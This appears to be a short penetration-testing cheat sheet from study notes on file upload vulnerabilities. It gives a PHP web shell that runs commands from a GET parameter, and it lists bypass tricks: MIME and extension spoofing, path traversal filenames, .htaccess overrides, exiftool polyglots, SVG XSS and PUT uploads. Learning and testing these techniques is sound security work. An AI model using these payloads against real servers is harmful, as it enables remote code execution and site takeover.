### Where to look

- Look for file upload functionalities throughout the application, including those related to business functions and profiles/account pages
### What to try

- PHP web shell `<?php echo system($_GET['command']); ?>` using `GET /example/exploit.php?command=id HTTP/1.1`
- Look for location of file upload or where it is being referenced in source or response code
- Change MIME type of upload to `image/png` via `Content-Type`
- Change `Content-Disposition` header value `filename` to include a path traversal sequence `../exploit.php`
- Try encoded path traversal sequences `..%2fexploit.php`
- Override server config with `htaccess` or `web.config` files, for example `AddType application/x-httpd-php .l33t` before a file called `exploit.l33t`
- Obfuscate file extensions, like `exploit.php.jpg`, `exploit.php.`, `exploit%2Ephp`, `exploit.asp;.jpg`, `exploit.asp%00.jpg`, or `exploit.p.phphp`
- Polyglot file with exiftool `exiftool "-comment<=webshell.php" photo.png`
- Upload XSS payloads via HTML or SVG images for client-side attacks
- Try uploading via PUT request support `PUT /images/exploit.php`

### More Details

More details can be found at [[Cyber Security/Learning/Web Security Academy/File Upload Vulnerabilities|File Upload Vulnerabilities]]